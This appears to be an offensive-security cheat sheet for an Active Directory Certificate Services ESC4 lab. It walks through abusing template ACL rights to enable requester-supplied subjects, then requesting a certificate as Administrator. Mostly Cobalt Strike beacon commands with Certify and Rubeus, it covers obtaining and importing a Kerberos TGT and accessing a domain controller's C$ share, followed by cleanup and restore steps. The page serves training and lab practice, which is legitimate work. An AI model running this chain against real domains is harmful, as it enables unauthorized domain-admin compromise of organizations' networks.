---
title: "AD CS ESC4 \u00b7 Certificate Template ACL Abuse"
description: "Inspect template modification rights, preserve the original attributes, convert the lab template to an ESC1 configuration, and restore its prior state."
category: "AD CS"
tools: ["Cobalt Strike", "Certify", "Rubeus", "Kerbeus BOF"]
updated: "2026-11-16"
tags: ["adcs", "esc4"]
draft: false
---

## 1. Why the attack works

ESC4 is control of a template's configuration through its ACL. Effective WriteProperty, GenericAll, WriteDacl or ownership-related rights may allow an identity to change enrollment or issuance controls and create another attack path.

The lab's `ESC4` template already allows enrollment, supports client authentication and issues without approval or signatures. Its missing condition is requester-controlled subject data, so the example changes only that setting.

## 2. Inspect and preserve the original value

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --template ESC4 --quiet
```

Preserve the original name-flag value before changing it. Use the same directory-authenticated PowerShell session for this attribute backup and restoration.

```powershell
Import-Module ActiveDirectory
$dc = 'lon-dc-1.contoso.com'
$config = (Get-ADRootDSE -Server $dc).configurationNamingContext
$base = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$config"
$template = Get-ADObject -LDAPFilter '(cn=ESC4)' -SearchBase $base -Server $dc -Properties 'msPKI-Certificate-Name-Flag'
$originalNameFlags = $template.'msPKI-Certificate-Name-Flag'
$template | Export-Clixml .\esc4-template-before.xml
```

## 3. Toggle subject supply and verify

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --template ESC4 --quiet
# Confirm ENROLLEE_SUPPLIES_SUBJECT is now enabled.
```

`--supply-subject` toggles the setting in the course version. Repeating it blindly can undo the intended change. If other prerequisites are absent, changing this flag alone will not create ESC1.

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC4 --upn Administrator --quiet
```

## Authenticate with the certificate

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:<CERTIFICATE_PFX_BASE64> /enctype:aes256 /nowrap
# Retain the returned TGT; this command does not import it.
```

The PFX must contain the private key. Verify certificate trust, validity, authentication usage, revocation availability and account mapping. An issued PFX does not prove that the KDC will accept it as the requested identity.

## Import and verify the TGT

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
```

Confirm the ticket client is `Administrator` and its service is `krbtgt/CONTOSO.COM`. Select one import path. Then verify an operation that the represented account is authorized to perform.

```shell
beacon> ls \\lon-dc-1\c$
```

## Session cleanup

```shell
beacon> krb_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <CREATED_PID>
```

Purging a ticket cache does not revoke the certificate. Record the issued request IDs and certificate serials for revocation through the CA when required.

## Restore the changed attribute

```powershell
if ($null -eq $originalNameFlags) {
    Set-ADObject -Identity $template.DistinguishedName -Clear 'msPKI-Certificate-Name-Flag' -Server $dc
} else {
    Set-ADObject -Identity $template.DistinguishedName -Replace @{'msPKI-Certificate-Name-Flag' = $originalNameFlags} -Server $dc
}
Get-ADObject -Identity $template.DistinguishedName -Properties 'msPKI-Certificate-Name-Flag' -Server $dc
```

This restores the one attribute modified above. If DACLs, ownership, EKUs or issuance controls were changed through another path, restore those separately from their original snapshots. Restoring the template does not revoke certificates already issued.

## Troubleshooting

| Symptom | Check |
|---|---|
| Template change fails or has no effect | Effective ACL rights, original toggle state, replication and CA template refresh |
| PKINIT fails | PFX includes its private key, PFX password if set, DC certificate/PKINIT support, clock and account mapping |
| Ticket imports but access is denied | Actual client identity, selected session, SPN and resource permissions |

## Quick checklist

```text
[ ] Verify effective template modification rights and all remaining ESC1 prerequisites.
[ ] Back up the original attribute before changing the template.
[ ] Toggle subject supply once and re-enumerate.
[ ] Request through ESC4 only after verifying the resulting configuration.

AUTHENTICATE AND VERIFY
[ ] Obtain the final PFX with its private key; verify the intended identity.
[ ] Rubeus asktgt /certificate:<PFX_BASE64> -> retain the returned TGT.
# Rubeus Alternative
[ ] createnetonly /ticket:<TGT_BASE64> -> record PID, then steal_token <CREATED_PID>.
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
[ ] run klist -> verify client, realm, service and expiration.
[ ] Test actual resource authorization for this identity.

CLEANUP
[ ] Purge only the disposable session, then rev2self.
[ ] Kill only the process created by the Rubeus alternative.
[ ] Remove exported private-key material when no longer needed; handle certificate revocation separately.
[ ] Restore the saved name flags and verify the result.
[ ] Restore any other changed attributes or ACLs from their own backups.
```

## Related references

- [ESC1 requester-controlled identity](/cheatsheets/adcs-esc1-cheatsheet/)
- [AD CS enumeration](/cheatsheets/adcs-enumeration-cheatsheet/)
- [Certify](https://github.com/GhostPack/Certify)
- [Rubeus](https://github.com/GhostPack/Rubeus)
